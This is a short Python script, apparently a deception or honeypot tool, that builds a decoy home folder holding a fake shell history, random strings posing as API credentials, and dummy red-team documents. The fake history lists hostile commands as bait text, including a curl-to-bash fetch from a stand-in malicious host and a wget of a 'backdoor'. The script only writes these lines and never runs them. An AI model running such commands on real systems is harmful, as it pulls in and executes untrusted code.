import os
import random
import string
import json
from pathlib import Path

FAKE_HOME = Path.home() / "lune_fake"

def rand_str(length=12):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def create_fake_bash_history():
    entries = [
        "curl http://malicious.example.com/payload.sh | bash",
        "nmap -sS 10.0.0.0/24",
        "ssh user@10.10.10.5",
        "wget http://192.168.1.8/backdoor",
        f"python3 {rand_str()}.py"
    ]
    fake_hist = FAKE_HOME / ".bash_history"
    with fake_hist.open("w") as f:
        f.write("\n".join(random.choices(entries, k=30)))

def create_fake_config():
    creds = {f"api_{i}": rand_str(32) for i in range(10)}
    config_file = FAKE_HOME / "config.json"
    with config_file.open("w") as f:
        json.dump(creds, f, indent=2)

def create_fake_docs():
    docs_dir = FAKE_HOME / "Documents"
    docs_dir.mkdir(parents=True, exist_ok=True)
    for i in range(5):
        (docs_dir / f"Project_{rand_str(5)}.docx").write_text("Confidential: Red Team Engagement\n")

def run():
    FAKE_HOME.mkdir(parents=True, exist_ok=True)
    create_fake_bash_history()
    create_fake_config()
    create_fake_docs()
    print(f"[+] Deceit Injection complete: {FAKE_HOME}")

def main():
    run()

if __name__ == "__main__":
    main()
